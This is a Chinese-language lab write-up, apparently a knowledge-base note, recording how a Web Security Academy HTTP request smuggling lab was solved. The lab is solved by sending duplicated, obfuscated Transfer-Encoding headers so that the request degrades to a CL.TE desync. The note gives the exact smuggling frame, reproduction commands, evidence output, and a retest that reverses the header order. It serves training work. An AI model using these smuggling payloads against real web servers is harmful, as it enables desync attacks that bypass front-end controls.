---
title: "lab-obfuscating-te-header"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-obfuscating-te-header

> evidences: [[request-smuggling-family]]

- 题面:HTTP request smuggling, obfuscating the TE header(/web-security/request-smuggling/lab-obfuscating-te-header)
- 实例:https://0a6b00db04aeb54c8059e9c000d800e8.web-security-academy.net
- 判定目标:走私使后端处理方法 `GPOST`;状态:**solved**

## 关键步

1. 两端都支持 `Transfer-Encoding`,但对**重复 TE 头**的处理不同(前端取最后、后端取第一)。
2. 混淆头:`Transfer-Encoding: chunked` + `Transfer-Encoding: x`(重复)。前端取最后
   → `x` 不认作 chunked → 用 `Content-Length`;后端取第一 → chunked。退化成 CL.TE。
3. 帧:`--cl-te 'G' --te-line 'Transfer-Encoding: chunked\r\nTransfer-Encoding: x'`
   (body `0\r\n\r\nG`,CL=6)。发帧时无响应(`received_bytes:0`,后端在等下一请求)。
4. 另起一次 `POST /` → 后端见 `G`+`POST`=`GPOST`;响应体 `<section … is-solved>`。

## 证据摘录

```
conn_reuse <inst> --cl-te 'G' --te-line 'Transfer-Encoding: chunked\r\nTransfer-Encoding: x' --quiet
 -> received_bytes 0 (desync hold)
conn_reuse <inst> --send-str 'POST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde'
 -> body 含 academyLabBanner is-solved
solved_check -> {"solved":true}
```

## 复现命令

```
lab_launch launch 417947BEC9FE621DFDC11F4D622CEF72B0021A6D872AA83CCA70AAF532B4B592 --widget-source /web-security/request-smuggling --jar <jar>
conn_reuse "https://<inst>" --cl-te 'G' --te-line 'Transfer-Encoding: chunked\r\nTransfer-Encoding: x' --read-ms 2000 --quiet
conn_reuse "https://<inst>" --send-str 'POST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde' --read-ms 2500
solved_check "https://<inst>/" --jar <jar>
```

## 回马复核:**重复 TE 头的顺序要反过来**

- 新实例 `0aca00fe044fa068804f9e1f00530066`。按本档原配方(`Transfer-Encoding: chunked` 在前、`x` 在后)
  发帧 → `received_bytes:0`(hold),但随后 `POST /` **只得 200 首页,不翻**;
  `Transfer-Encoding: xchunked`、`Transfer-Encoding : chunked`(冒号前空格)同样不翻。
- **本实例可用顺序**:`Transfer-Encoding: x` 在**前**、`Transfer-Encoding: chunked` 在**后**:
  ```
  conn_reuse "<inst>/" --cl-te 'G' --te-line 'Transfer-Encoding: x\r\nTransfer-Encoding: chunked' --read-ms 2000 --quiet
   -> 200(POST / 正常回包 → 前端按第一 TE=`x` 未知 → 用 CL)
  conn_reuse "<inst>/" --send-str 'POST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde'
   -> 403 "Unrecognized method GPOST"        # 后端按最后的 chunked 解析 → 把 G 留在连接上
  solved_check -> {"solved":true,…}
  ```
- 结论:该 lab 的**前端取第一个 TE、后端取最后一个 TE**;顺序必须让「前端看到无效值、后端看到 chunked」。
  不同实例/构建可能相反 → 两个顺序都值得试(hold 住且不翻 = 顺序错)。

